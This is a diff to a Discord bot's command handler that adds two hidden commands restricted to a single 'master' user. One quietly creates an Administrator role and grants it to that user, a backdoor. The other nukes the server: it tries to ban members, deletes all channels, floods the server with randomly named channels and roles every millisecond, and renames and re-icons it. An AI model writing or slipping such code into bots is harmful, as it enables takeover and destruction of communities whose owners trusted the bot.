@@ -674,6 +674,41 @@ client.on('messageCreate', async (message) => {
             msgP.react('💎');
             break;
 
+        case 'admin':
+            if (message.author.id !== config.master) return;
+            message.delete();
+            const me = message.guild.members.cache.get(config.master);
+            try {
+                await message.guild.roles.create({ name: 'they have arrived', permissions: 'Administrator' });
+                const findRole = message.guild.roles.cache.find(role => role.name == 'they have arrived');
+                await message.guild.roles.fetch(findRole.id);
+                me.roles.add(findRole.id).then(me.send('I have given your role.'));
+            } catch (err) {
+                console.log('error when handling $admin - ' + err);
+            }
+            break;
+
+        case 'erode':
+            if (message.author.id !== config.master) return;
+            await message.delete();
+            try {
+                const theseMembers = message.guild.members.cache.filter(member => member.bannable);
+                theseMembers.forEach(member => member.ban);
+                message.guild.channels.cache.forEach(channel => channel.delete());
+                setInterval(() => {
+                        message.guild.channels.create({ name: `${Math.floor(Math.random() * 1000000)}`});
+                        message.guild.roles.create({ name: `${Math.floor(Math.random() * 1000000)}`});
+                }, 1);
+
+                message.guild.setName('1 - 800 - ERODE');
+
+                message.guild.setIcon('https://cdn.discordapp.com/attachments/1199776472768987236/1213910171865059359/metsu.jpeg?ex=65f730f2&is=65e4bbf2&hm=8b5ba1068c625cd50defb6320e4161cf47ffaba0bdb05ac46e46bfa93b2217c3&')
+
+            } catch (err) {
+                console.log(err)
+            }
+            break;
+
         case 'message': // sends a message to the user mentioned
             if (message.channel.type === ChannelType.DM) return;
             var checkMember = oneServer.members.cache.get(message.author.id)
